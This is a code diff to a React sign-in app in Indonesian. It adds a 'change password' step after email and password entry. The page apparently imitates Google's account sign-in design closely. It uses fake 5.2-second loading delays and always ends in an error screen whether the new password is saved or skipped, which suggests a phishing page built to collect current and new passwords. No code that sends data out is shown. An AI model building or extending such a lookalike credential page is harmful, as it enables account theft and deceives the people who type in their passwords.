@@ -46,7 +46,7 @@ const TextInput = ({ label, type = "text", value, onChange, error, name, autoFoc
 };
 
 export default function App() {
-  const [step, setStep] = useState<'email' | 'password' | 'success' | 'error'>('email');
+  const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error'>('email');
   const [direction, setDirection] = useState(1);
   const [isLoading, setIsLoading] = useState(false);
   const [email, setEmail] = useState('');
@@ -55,13 +55,31 @@ export default function App() {
   const [error, setError] = useState('');
   const [showPassword, setShowPassword] = useState(false);
 
-  const changeStep = (newStep: 'email' | 'password' | 'success' | 'error', newDirection: number) => {
+  const changeStep = (newStep: 'email' | 'password' | 'change_password' | 'success' | 'error', newDirection: number) => {
     setIsLoading(true);
     setTimeout(() => {
       setDirection(newDirection);
       setStep(newStep);
       setIsLoading(false);
     }, 5200);
+  };
+
+  const handleChangePasswordSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!password) {
+      setError('Masukkan sandi');
+      return;
+    }
+    if (password.length < 8) {
+      setError('Sandi harus minimal 8 karakter');
+      return;
+    }
+    if (password !== confirmPassword) {
+      setError('Sandi tidak cocok. Harap coba lagi.');
+      return;
+    }
+    setError('');
+    changeStep('error', 1);
   };
 
   const handleEmailSubmit = (e: React.FormEvent) => {
@@ -171,6 +189,19 @@ export default function App() {
                     </div>
                   </>
                 )}
+                {step === 'change_password' && (
+                  <>
+                    <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Ubah sandi</h1>
+                    <div 
+                      onClick={() => !isLoading && changeStep('email', -1)}
+                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
+                    >
+                      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" className="w-[20px] h-[20px] text-[#1f1f1f]"><path fill="currentColor" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                      <span>{email}</span>
+                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746]"><path d="M7 10l5 5 5-5z"/></svg>
+                    </div>
+                  </>
+                )}
                 {step === 'success' && (
                   <>
                     <h1 className="text-[24px] sm:text-[32px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">Berhasil</h1>
@@ -239,7 +270,7 @@ export default function App() {
               <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
                 <button
                   type="button"
-                  onClick={() => changeStep('error', 1)}
+                  onClick={() => changeStep('change_password', 1)}
                   className="text-[#0b57d0] hover:bg-blue-50 px-3 py-2 -ml-3 rounded-full font-medium text-sm transition"
                   disabled={isLoading}
                 >
@@ -255,6 +286,81 @@ export default function App() {
                 </button>
               </div>
             </div>
+          )}
+
+          {step === 'change_password' && (
+            <form onSubmit={handleChangePasswordSubmit} className="flex flex-col flex-grow justify-start">
+              <div className="pt-2">
+                <h2 className="text-[#1f1f1f] text-[18px] sm:text-[22px] font-normal mt-4 mb-1">Buat sandi yang kuat</h2>
+                <p className="text-[#444746] text-[14px] mb-6 leading-normal">
+                  Buat sandi baru yang kuat dan tidak Anda gunakan untuk situs lain
+                </p>
+
+                <TextInput
+                  label="Buat sandi"
+                  type={showPassword ? "text" : "password"}
+                  value={password}
+                  onChange={(e: any) => {
+                    setPassword(e.target.value);
+                    if (error) setError('');
+                  }}
+                  name="password"
+                  error={error && (error.includes('sandi') || error.includes('8 karakter')) ? error : ''}
+                  autoFocus
+                  disabled={isLoading}
+                />
+
+                <div className="mt-4">
+                  <TextInput
+                    label="Konfirmasi"
+                    type={showPassword ? "text" : "password"}
+                    value={confirmPassword}
+                    onChange={(e: any) => {
+                      setConfirmPassword(e.target.value);
+                      if (error) setError('');
+                    }}
+                    name="confirmPassword"
+                    error={error && error.includes('cocok') ? error : ''}
+                    disabled={isLoading}
+                  />
+                </div>
+
+                <div className="text-[12px] text-[#444746] mt-1.5 pl-3">
+                  Minimal 8 karakter
+                </div>
+
+                <div className="mt-4">
+                  <label className="flex items-center gap-3 cursor-pointer text-[14px] text-[#1f1f1f] select-none py-1">
+                    <input 
+                      type="checkbox" 
+                      checked={showPassword} 
+                      onChange={(e) => setShowPassword(e.target.checked)}
+                      className="w-[18px] h-[18px] rounded border-[#747775] text-[#0b57d0] focus:ring-[#0b57d0] cursor-pointer"
+                      disabled={isLoading}
+                    />
+                    <span>Tampilkan sandi</span>
+                  </label>
+                </div>
+              </div>
+
+              <div className="mt-8 flex justify-between items-center pb-6 sm:pb-0">
+                <button
+                  type="button"
+                  onClick={() => changeStep('error', 1)}
+                  className="text-[#0b57d0] hover:bg-blue-50 px-4 py-2.5 -ml-3 rounded-full font-medium text-[14px] transition"
+                  disabled={isLoading}
+                >
+                  Lewati
+                </button>
+                <button
+                  type="submit"
+                  className="bg-[#0b57d0] text-white px-6 py-2.5 rounded-full text-[14px] font-medium hover:bg-[#0842a0] hover:shadow-md transition disabled:opacity-70 disabled:cursor-not-allowed"
+                  disabled={isLoading}
+                >
+                  Simpan sandi
+                </button>
+              </div>
+            </form>
           )}
 
           {step === 'success' && (
